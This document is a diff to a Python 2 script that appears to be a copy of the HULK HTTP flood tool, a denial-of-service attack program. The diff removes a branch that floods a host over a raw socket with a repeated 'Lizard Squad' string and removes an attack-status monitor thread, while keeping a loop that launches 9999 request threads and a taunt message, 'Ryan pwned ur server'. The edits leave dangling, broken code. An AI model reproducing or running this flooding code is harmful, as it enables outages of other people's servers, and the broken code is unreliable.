@@ -89,12 +89,6 @@ def httpcall(url):
 			#print e.code
 			print 'Ryan pwned ur server'
 			code=500
-	else:
-			inc_counter()
-			s.connect((host,80))
-			s.send("Lizard Squad" * 109951162777600)
-			
-	return(code)
 
 	
 #http caller thread 
@@ -106,14 +100,7 @@ class HTTPThread(threading.Thread):
 					
 		except Exception, ex:
 			pass
-
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		if flag==2:
-			print "\n-- HULK Attack Finished ---"
-
-#execute 
+		
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -134,7 +121,5 @@ else:
 		for i in range(9999):
 			t = HTTPThread()
 			t.start()
-		t = MonitorThread()
-		t.start()
 		
  
